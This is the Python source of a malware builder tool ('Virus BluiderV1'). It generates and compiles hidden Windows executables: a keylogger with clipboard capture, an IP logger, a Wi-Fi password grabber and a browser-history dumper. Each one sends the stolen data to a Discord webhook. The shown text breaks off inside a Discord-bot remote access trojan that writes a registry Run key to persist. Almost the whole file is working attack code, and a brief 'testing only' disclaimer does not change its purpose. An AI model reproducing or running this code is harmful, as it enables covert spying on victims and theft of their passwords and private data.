import os
import platform
import time
from time import sleep
from colorama import Fore, Style, init
from pystyle import Colorate, Colors, Center
import sys
import subprocess
import shutil
import requests
import socket
import getpass
import uuid

init(autoreset=True)

def set_window_size(width, height):
    if platform.system() == "Windows":
        os.system(f"mode con: cols={width} lines={height}")
    else:
        os.system(f"printf '\e[8;{height};{width}t'")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


banner = f'''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED}⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED}⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED}⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀{Fore.RED}⣀⡴⢧⣀⠀⠀{Fore.WHITE}⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀{Fore.RED}⠘⠏{Fore.WHITE}⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
{Fore.RED}⠐⠀{Fore.WHITE}⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
{Fore.RED}⠈{Fore.WHITE}⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁{Fore.RED}⢀⣀⠀⠀⠀⠀
{Fore.RED}⠠⠀{Fore.WHITE}⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀{Fore.RED}⠘⠞{Fore.WHITE}⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀{Fore.RED}⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀{Fore.RED}⠘⠿⠀⠀⠀⠀⠀{Fore.WHITE}⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀{Fore.RED}⠉⢳⡞⠉⠀⠀⠀⠀⠁{Fore.WHITE}                                                        
{Style.RESET_ALL}
'''

menu_text = f'''
               {Fore.RED}• {Fore.WHITE}▌  ▄ {Fore.RED}·. {Fore.WHITE}▄▄▄ {Fore.RED}.·{Fore.WHITE}▄▄▄▄  {Fore.RED}▪   {Fore.WHITE}▄▄▄{Fore.RED}·{Fore.WHITE}
               {Fore.RED}·{Fore.WHITE}██ ▐███{Fore.RED}▪{Fore.WHITE}▀▄{Fore.RED}.{Fore.WHITE}▀{Fore.RED}·{Fore.WHITE}██{Fore.RED}▪ {Fore.WHITE}██ ██ ▐█ ▀█
               ▐█ ▌▐▌▐█{Fore.RED}·{Fore.WHITE}▐▀▀{Fore.RED}▪{Fore.WHITE}▄▐█{Fore.RED}· {Fore.WHITE}▐█▌▐█{Fore.RED}·{Fore.WHITE}▄█▀▀█
               ██ ██▌▐█▌▐█▄▄▌██{Fore.RED}. {Fore.WHITE}██ ▐█▌▐█ {Fore.RED}▪{Fore.WHITE}▐▌
               ▀▀  █{Fore.RED}▪{Fore.WHITE}▀▀▀ ▀▀▀ ▀▀▀▀▀{Fore.RED}• {Fore.WHITE}▀▀▀ ▀  ▀
 ┌─────────────────────────────────────────────────────────────┐
 │ made by DKVOX | Virus BluiderV1 | Tool Version V1                           │

 └─────────────────────────────────────────────────────────────┘
                Type help to enter menu
'''

def show_tool_options():
    clear_screen()
    print(f'''

              ███{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗  {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}
              ████{Fore.RED}╗  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║╚{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╔╝{Fore.WHITE}
              ██{Fore.RED}╔{Fore.WHITE}██{Fore.RED}╗ {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║ ╚{Fore.WHITE}███{Fore.RED}╔╝{Fore.WHITE}
              ██{Fore.RED}║╚{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║ {Fore.WHITE}██{Fore.RED}╔{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}
              ██{Fore.RED}║ ╚{Fore.WHITE}████{Fore.RED}║{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔╝ {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}
              {Fore.RED}╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝ {Fore.WHITE}

┌──────────────┳───────────────┳─────────────┐
│              │               │             │
│          ┌───└───────────────┘───┐         │
│          │        {Fore.RED}𝓛𝓸𝓰𝓰𝓮𝓻𝓼        {Fore.WHITE}│         │
│          └─┳───────────────────┳─┘         │
│      ┌─────│                   │─────┐     │
│      │  {Fore.RED}✪  {Fore.WHITE}│                   │  {Fore.RED}✪  {Fore.WHITE}│     │
│ ┌────└─────┘                   └─────┘───┐ │
│ │            <1> Key logger              │ │
│ │            <2> Ip Logger               │ │
│ │            <3> Wifi logger             │ │
│ │            <4> History logger          │ │
│ │            <5> Rat builder             │ │
│ │            <6> Next page               │ │
└─└────────────────────────────────────────┘─┘

''')

def print_banner(banner_text):
    for line in banner_text.splitlines():
        print(line)
        sleep(0.1)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    set_window_size(100, 40)
    clear()
    print_banner(banner)
    print(menu_text)

    current_username = os.getlogin()

    while True:
        print(f"┌───────)-{Colorate.Horizontal(Colors.red_to_white, f'Kernel@ToolV1(user={current_username})')}")
        choice = input("└─# ").strip().lower()

        if choice == 'help':
            show_tool_options()

        elif choice == 'exit':
            print(f"{Fore.RED}[EXITING]")
            break

        elif choice == '1':
            keylogger()

        elif choice == '2':
            ipgrabber()

        elif choice == '3':
            wifigrab()

        elif choice == '4':
            history()

        elif choice == '5':
            ratter()

        elif choice == '6':
            info()

        else:
            print(f"{Fore.RED}[ERROR] Invalid {choice}")



def info():
    while True:
        clear_screen()
        print(f"""



┌──────────────────────────────────────┐
│               {Fore.RED}Welcome {Fore.WHITE}               │
├──────────────────────────────────────┤
│   <1> read {Fore.GREEN}me                  {Fore.WHITE}      │
│   <2> Requirement Installer          │
│   <3> Go Back                        │
└──────────────────────────────────────┘
""")
        choice = input("Info menu └─# ").strip()
        if choice == '1':
            rules()
        elif choice == '2':
            requirements_menu()
        elif choice == '3':
            print("closing")
            time.sleep(1)
            clear_screen()
            show_tool_options()
            break
        else:
            print(f"{Fore.RED}Invalid{Style.RESET_ALL}")
            time.sleep(1)






def requirements_menu():
    clear()
    print(f"""
┌────────────────────────────────────┐
│       {Fore.RED}Requirements {Fore.GREEN}Installer       {Fore.WHITE}│
├────────────────────────────────────┤
│       Do you wanna {Fore.GREEN}install {Fore.WHITE}the     {Fore.WHITE}│
│       {Fore.RED}Requirements {Fore.WHITE}for this {Fore.BLUE}tool   {Fore.WHITE}│
│                                    │
│                [{Fore.GREEN}y{Fore.WHITE}] {Fore.GREEN}Yes             {Fore.WHITE}│
│                [{Fore.RED}n{Fore.WHITE}] {Fore.RED}No              {Fore.WHITE}│
└────────────────────────────────────┘
""")
    while True:
        choice = input("Installer └─# ").strip().lower()
        if choice == 'y':
            print("Opening installer")
            time.sleep(1)
            install_required_packages()
            break
        elif choice == 'n':
            print("Going back")
            time.sleep(1)
            break
        else:
            print(f"{Fore.WHITE}Invalid type ({Fore.GREEN}y{Fore.WHITE}) {Fore.WHITE}or ({Fore.RED}n{Fore.WHITE})")
            time.sleep(1)





def install_required_packages():
    pip_packages = [
        "pyinstaller",
        "requests",
        "pynput",
        "pywin32",
        "colorama",
        "pystyle",
        "discord.py",
        "Pillow",
        "opencv-python",
    ]

    package_str = " ".join(pip_packages)
    command = f'start cmd /k "echo Installing packages... && pip install {package_str} && echo. && echo Installation complete. && pause"'
    subprocess.run(command, shell=True)





def rules():
    while True:
        clear_screen()
        print(f"""
    ┌───────────────────────────────────────────────┐
    │          ⚠ Tool Usage Guidelines ⚠            │
    ├───────────────────────────────────────────────┤
    │         This tool is only for {Fore.GREEN}testing         {Fore.WHITE}│
    │                                               │
    │        ❗ Do {Fore.RED}not {Fore.WHITE}use this tool for            │
    │           - Logging {Fore.RED}random {Fore.WHITE}people             │
    │           - {Fore.RED}Unauthorized {Fore.WHITE}access               │
    │           - Or {Fore.RED}malicious {Fore.WHITE} purposes            │
    │                                               │
    │         Make sure to have {Fore.GREEN}permissions         {Fore.WHITE}│
    │            When testing the loggers           │
    │                                               │
    │                Read more at {Fore.RED}⮟                 {Fore.WHITE}│
    │     www.{Fore.RED}law{Fore.WHITE}.cornell.edu/uscode/text/18/1030   │
    └───────────────────────────────────────────────┘
    {Style.RESET_ALL}""")
        user_input = input(f"\n{Fore.WHITE}[type (back) to enter menu]\n{Fore.WHITE}└─# ").strip().lower()
        if user_input == 'back':
            clear_screen()
            show_tool_options()
            break
        else:
            print(f"{Fore.RED}⚠ error command Type 'back' to enter menu")
            time.sleep(2)



def keylogger():
    while True:
        clear()
        keylogger_logo = '''\
     8 8 8 8                     ,ooo.
     8a8 8a8                    oP   ?b
    d888a888zzzzzzzzzzzzzzzzzzzz8     8b
     `""^""'                    ?o___oP'


enter an discord webhook
'''
        colored_logo = Colorate.Horizontal(Colors.red_to_white, Center.XCenter(keylogger_logo))
        print(colored_logo)

        webhook = input("└─➔ ").strip()

        if webhook.startswith("https://discordapp.com/api/webhooks/") or webhook.startswith("https://discord.com/api/webhooks/"):
            break
        else:
            print("\nERROR INVALID")
            time.sleep(3)

    keylogger_code = f'''
import os
import time
import threading
import requests
import win32clipboard
import win32gui
from pynput import keyboard

WEBHOOK_URL = "{webhook}"
keystroke_buffer = []
last_window = ""
lock = threading.Lock()

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def send_embed_to_discord(text, window_title):
    if not text.strip():
        return
    embed = {{
        "title": f"Keystrokes in {{window_title}}",
        "description": text,
        "color": 0x00ffcc,
        "footer": {{"text": f"Captured at {{time.strftime('%Y-%m-%d %H:%M:%S')}}" }}
    }}
    data = {{"embeds": [embed]}}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def on_press(key):
    global keystroke_buffer, last_window
    try:
        k = key.char if hasattr(key, 'char') and key.char else ''
    except:
        k = ''

    window = get_active_window_title()
    with lock:
        global last_window
        if window != last_window:
            last_window = window
            send_embed_to_discord(f"Window switched: {{window}}", window)

        if key == keyboard.Key.space or key == keyboard.Key.enter:
            text = ''.join(keystroke_buffer)
            if text:
                send_embed_to_discord(text + (" [ENTER]" if key == keyboard.Key.enter else ""), window)
            keystroke_buffer.clear()
        elif key == keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer.pop()
        elif k:
            keystroke_buffer.append(k)

def on_release(key):
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        try:
            win32clipboard.OpenClipboard()
            clip = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            send_embed_to_discord(f"Clipboard copied:\\n{{clip}}", "Clipboard")
        except:
            pass

def start_listener():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    while True:
        time.sleep(10)
'''

    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
    script_path = os.path.join(downloads, "built_keylogger.py")

    try:
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(keylogger_code)
    except Exception as e:
        print(f"Error making script: {e}")
        time.sleep(3)
        return

    print(f"Keylogger script done: {script_path}")

    print("Building exe")

    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--distpath", downloads,
        "--name", "keylogger_built",
        script_path
    ]

    try:
        subprocess.run(pyinstaller_cmd, check=True)
        print(f"Build done saved in> {downloads} as 'keylogger_built.exe'")
    except subprocess.CalledProcessError as e:
        print(f"PyInstaller build failed: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

    input("done")


def ipgrabber():
    init(autoreset=True)

    while True:
        clear()

        iplogger_logo = '''
         .AMMMMMMMMMMA.
       .AV. :::.:.:.::MA.
      A' :..        : .:`A
     A'..              . `A.
    A' :.    :::::::::  : :`A
    M  .    :::.:.:.:::  . .M
    M  :   ::.:.....::.:   .M
    V : :.::.:........:.:  :V
   A  A:    ..:...:...:.   A A
  .V  MA:.....:M.::.::. .:AM.M
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A
:M .  .`VMMMMMMV.:A `VMMMMV .:M:
 V.:.  ..`VMMMV.:AM..`VMV' .: V
  V.  .:. .....:AMMA. . .:. .V
   VMM...: ...:.MMMM.: .: MMV
       `VM: . ..M.:M..:::M'
         `M::. .:.... .::M
          M:.  :. .... ..M
          V:  M:. M. :M .V
          `V.:M.. M. :M.V'

Enter your webhook
'''
        colored_logo = Colorate.Horizontal(Colors.red_to_white, Center.XCenter(iplogger_logo))
        print(colored_logo)

        webhook = input().strip()

        if webhook.startswith("https://discordapp.com/api/webhooks/") or webhook.startswith("https://discord.com/api/webhooks/"):
            break
        else:
            print(Fore.RED + "\nInvalid webhook URL" + Style.RESET_ALL)
            time.sleep(3)

    image_url = "https://media.discordapp.net/attachments/1373003383321133209/1373703388847669389/images.jpg?ex=682b607a&is=682a0efa&hm=9b01a9faadca74cb0cc86fd5f307b0a195b098cc1fad360c442fa787a7c9506f&=&format=webp&width=344&height=330"

    ipconfig_script = f'''
import subprocess
import requests
import time

WEBHOOK_URL = "{webhook}"

def get_ipconfig():
    try:
        return subprocess.check_output("ipconfig /all", shell=True, text=True)
    except Exception as e:
        return f"Error running ipconfig: {{e}}"

def get_ipinfo():
    try:
        res = requests.get("https://ipinfo.io/json", timeout=5)
        if res.status_code == 200:
            data = res.json()
            return "\\n".join([f"{{k}}: {{v}}" for k, v in data.items() if not k.startswith('readme')])
        else:
            return f"error getting ip info status code {{res.status_code}}"
    except Exception as e:
        return f"Error getting info: {{e}}"

def send_embed(content):
    embed = {{
        "title": "Ip logger info",
        "description": "```\\n" + content + "\\n```",
        "color": 0xFF0000,
        "image": {{"url": "{image_url}"}},
        "footer": {{
            "text": "Sent at " + time.strftime("%Y-%m-%d %H:%M:%S")
        }}
    }}
    try:
        requests.post(WEBHOOK_URL, json={{"embeds": [embed]}}, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    ipconfig_data = get_ipconfig()
    ipinfo_data = get_ipinfo()
    combined = ipconfig_data + "\\n\\n[+] IP Info from ipinfo.io:\\n" + ipinfo_data
    send_embed(combined)
'''

    script_filename = "ipconfig_sender.py"
    with open(script_filename, "w", encoding="utf-8") as f:
        f.write(ipconfig_script)

    print(Fore.GREEN + "\nBuilding logger wait" + Style.RESET_ALL)

    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", script_filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "ERROR: PyInstaller failed" + Style.RESET_ALL)
        time.sleep(3)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "ipconfig_sender.exe"
    dist_path = os.path.join("dist", exe_name)
    final_path = os.path.join(downloads_path, exe_name)

    try:
        shutil.move(dist_path, final_path)
        print(Fore.CYAN + f"\nLogger saved to:\n{final_path}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Failed to move EXE: {e}" + Style.RESET_ALL)

    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    if os.path.exists(script_filename):
        os.remove(script_filename)
    if os.path.exists("ipconfig_sender.spec"):
        os.remove("ipconfig_sender.spec")

    input(Fore.YELLOW + "\ndubble tap enter to return" + Style.RESET_ALL)



def wifigrab():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        logo = '''
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀
        '''

        colored_logo = Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(logo))
        print(colored_logo)

        webhook = input(Fore.YELLOW + "Enter webhook " + Style.RESET_ALL).strip()

        if webhook.startswith("https://discordapp.com/api/webhooks/") or webhook.startswith("https://discord.com/api/webhooks/"):
            break
        else:
            print(Fore.RED + "Invalid webhook" + Style.RESET_ALL)
            time.sleep(3)

    wifi_script = f'''
import subprocess
import re
import requests
import time

WEBHOOK_URL = "{webhook}"

def get_wifi_profiles():
    profiles = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, encoding='utf-8')
        profiles = re.findall(r"All User Profile     : (.*)", output)
    except Exception as e:
        return [f"Error getting profiles: {{e}}"]
    return profiles

def get_wifi_password(profile):
    try:
        output = subprocess.check_output(f'netsh wlan show profile name="{{profile}}" key=clear', shell=True, text=True, encoding='utf-8')
        password_search = re.search(r"Key Content            : (.*)", output)
        if password_search:
            return password_search.group(1)
        else:
            return "(No Password Found)"
    except Exception as e:
        return f"Error: {{e}}"

def send_to_webhook(content):
    embed = {{
        "title": "Wifi password grabber",
        "description": content,
        "color": 0x00FF00,
        "footer": {{
            "text": "Sent at " + time.strftime("%Y-%m-%d %H:%M:%S")
        }}
    }}
    data = {{"embeds": [embed]}}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

if __name__ == "__main__":
    profiles = get_wifi_profiles()
    if isinstance(profiles, list) and profiles and not profiles[0].startswith("Error"):
        message = ""
        for profile in profiles:
            pwd = get_wifi_password(profile)
            message += f"**{{profile}}** : `{{pwd}}`\\n"
    else:
        message = "\\n".join(profiles)
    send_to_webhook(message)
'''

    script_filename = "wifi_grabber.py"
    with open(script_filename, "w", encoding="utf-8") as f:
        f.write(wifi_script)

    print(Fore.GREEN + "\nBuilding logger wait" + Style.RESET_ALL)

    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", script_filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "logger failed make sure u got pyinstaller installed" + Style.RESET_ALL)
        time.sleep(3)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "wifi_grabber.exe"
    dist_path = os.path.join("dist", exe_name)
    final_path = os.path.join(downloads_path, exe_name)

    try:
        shutil.move(dist_path, final_path)
        print(Fore.CYAN + f"\nBuild saved to:\n{final_path}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Failed to move exe: {e}" + Style.RESET_ALL)

    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    if os.path.exists(script_filename):
        os.remove(script_filename)
    spec_file = "wifi_grabber.spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)

    input(Fore.YELLOW + "\ndubble tap to go back" + Style.RESET_ALL)



def history():
    import sys
    import os
    import subprocess
    import shutil
    import time
    from colorama import init, Fore, Style
    from pystyle import Colorate, Colors, Center

    init(autoreset=True)
    clear = lambda: os.system("cls" if os.name == "nt" else "clear")

    chrome_logo = '''
╦ ╦╦╔═╗╔╦╗╔═╗╦═╗╦ ╦  ╔═╗╦═╗╔═╗╔╗ ╔╗ ╔═╗╦═╗
╠═╣║╚═╗ ║ ║ ║╠╦╝╚╦╝  ║ ╦╠╦╝╠═╣╠╩╗╠╩╗║╣ ╠╦╝
╩ ╩╩╚═╝ ╩ ╚═╝╩╚═ ╩   ╚═╝╩╚═╩ ╩╚═╝╚═╝╚═╝╩╚═
'''


    while True:
        clear()
        print(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(chrome_logo)))
        webhook = input(Fore.YELLOW + "Enter your webhook:\n" + Style.RESET_ALL).strip()

        if webhook.startswith("https://discordapp.com/api/webhooks/") or webhook.startswith("https://discord.com/api/webhooks/"):
            break

        print(Fore.RED + "\nInvalid webhook" + Style.RESET_ALL)
        time.sleep(2)

    script_code = fr'''
import os
import sqlite3
import shutil
import requests
import tempfile

WEBHOOK_URL = "{webhook}"

def send_file_to_webhook(file_path):
    try:
        with open(file_path, "rb") as f:
            filename = os.path.basename(file_path)
            files = {{
                "file": (filename, f)
            }}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 204:
                print("[+] Sent to webhook")
            else:
                print(f"[-] Failed to send: {{response.status_code}}")
    except Exception as e:
        print(f"[-] Exception sending file: {{e}}")

def dump_history_from_db(history_path, browser_name):
    if not os.path.exists(history_path):
        print(f"[-] {{browser_name}} history file not found")
        return None

    temp_file = tempfile.NamedTemporaryFile(delete=False)
    temp_history = temp_file.name
    temp_file.close()
    shutil.copy2(history_path, temp_history)

    conn = sqlite3.connect(temp_history)
    cursor = conn.cursor()

    query = "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20"

    history_lines = []
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        for url, title in results:
            if url:
                history_lines.append(url)
    except Exception as e:
        print(f"[-] Error reading {{browser_name}} history: {{e}}")
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_history)

    return history_lines

def dump_firefox_history():
    user_profile = os.environ.get("USERPROFILE")
    places_path = os.path.join(user_profile, r"AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if not os.path.exists(places_path):
        print("[-] Firefox profiles folder not found.")
        return None

    profiles = [d for d in os.listdir(places_path) if os.path.isdir(os.path.join(places_path, d))]
    if not profiles:
        print("[-] No Firefox profiles found.")
        return None

    history_lines = []
    for profile in profiles:
        history_db = os.path.join(places_path, profile, "places.sqlite")
        if not os.path.exists(history_db):
            continue

        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_history = temp_file.name
        temp_file.close()
        shutil.copy2(history_db, temp_history)

        try:
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            query = "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 20"
            cursor.execute(query)
            results = cursor.fetchall()
            for url, title in results:
                if url:
                    history_lines.append(url)
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"[-] Error reading Firefox history: {{e}}")
        finally:
            os.remove(temp_history)

    return history_lines if history_lines else None

def main():
    user_profile = os.environ.get("USERPROFILE")

    history_all = []

    chrome_path = os.path.join(user_profile, r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    chrome_history = dump_history_from_db(chrome_path, "Chrome")
    if chrome_history:
        history_all.extend(chrome_history)

    edge_path = os.path.join(user_profile, r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
    edge_history = dump_history_from_db(edge_path, "Edge")
    if edge_history:
        history_all.extend(edge_history)

    firefox_history = dump_firefox_history()
    if firefox_history:
        history_all.extend(firefox_history)

    if not history_all:
        print("[-] ERROR NO HISTORY FOUND")
        return

    output_file = "browser_history_dump.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        for url in history_all:
            f.write(url + "\\n")

    print(f"[+] History dumped to {{output_file}}. Sending to webhook")
    send_file_to_webhook(output_file)

    if os.path.exists(output_file):
        os.remove(output_file)

if __name__ == "__main__":
    main()
'''

    filename = "browser_history_dumper.py"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(script_code)

    print(Fore.GREEN + "\nBuilding history logger" + Style.RESET_ALL)
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "ERROR: PyInstaller failed" + Style.RESET_ALL)
        time.sleep(3)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "browser_history_dumper.exe"
    dist_path = os.path.join("dist", filename.replace(".py", ".exe"))
    final_path = os.path.join(downloads_path, exe_name)

    try:
        shutil.move(dist_path, final_path)
        print(Fore.CYAN + f"\nDONE and moved to:\n{final_path}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"ERROR: Failed to move file — {e}" + Style.RESET_ALL)

    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    if os.path.exists(filename):
        os.remove(filename)
    spec_file = filename.replace(".py", ".spec")
    if os.path.exists(spec_file):
        os.remove(spec_file)

    input(Fore.YELLOW + "\ndubble tap to go back" + Style.RESET_ALL)



def ratter():
    init(autoreset=True)
    clear()


    print(f'''
┌───────────────────────────────────────────────┐
│          {Fore.RED}⚠ {Fore.WHITE}How to build the {Fore.RED}rat {Fore.WHITE}⚠             │
├───────────────────────────────────────────────┤
│                                               │
│                                               │
│   -Go to {Fore.BLUE}discord{Fore.WHITE}.com/{Fore.GREEN}developers{Fore.WHITE}/{Fore.RED}applications  {Fore.WHITE}│
│                                               │
│           -{Fore.GREEN}press {Fore.WHITE}new application              │
│                                               │
│              -{Fore.YELLOW}name {Fore.WHITE}ur bot                     │
│                                               │
│          -Press on {Fore.RED}OAuth2 {Fore.WHITE}menu                │
│                                               │
│    - go till you see {Fore.RED}OAuth2 {Fore.GREEN}URL {Fore.WHITE}Generator     │
│                                               │
│       -press on bot and {Fore.BLUE}administrator         {Fore.WHITE}│
│                                               │
│     - copy the url and save it {Fore.CYAN}anywhere       {Fore.WHITE}│
│                                               │
│          -press on bot menu and {Fore.GREEN}Enable        {Fore.WHITE}│
│      ┌────└───────────────────────┘───┐       │
│      │        Presence Intent         │       │
│      │     Server Members Intent      │       │
│      │    Message Content Intent      │       │
│      └────────────────────────────────┘       │
│       Then scroll down till bot perms and     │
│                 enable {Fore.GREEN}admin                  {Fore.WHITE}│
│                                               │
│            Then reset bot {Fore.RED}token               {Fore.WHITE}│
│         Then save it in a {Fore.CYAN}txt {Fore.WHITE}file etc        │
│         then invite ur bot to {Fore.BLUE}discord         {Fore.WHITE}│
│                                               │
└───────────────────────────────────────────────┘
               Scroll up please
''')

    logo = '''

    '''
    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(logo)))
    print(Fore.YELLOW + "\nEnter your discord bot token" + Style.RESET_ALL)

    token = input("> ").strip()

    if not token or len(token) < 50:
        print(Fore.RED + "Invalid TOKEN" + Style.RESET_ALL)
        time.sleep(2)
        return

    bot_script = f'''
import discord
import asyncio
import os
import subprocess
import requests
from PIL import ImageGrab
import tempfile
import sys
import cv2

if os.name == "nt":
    import winreg

TOKEN = "{token}"

def add_to_startup():
    if os.name != "nt":
        return
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
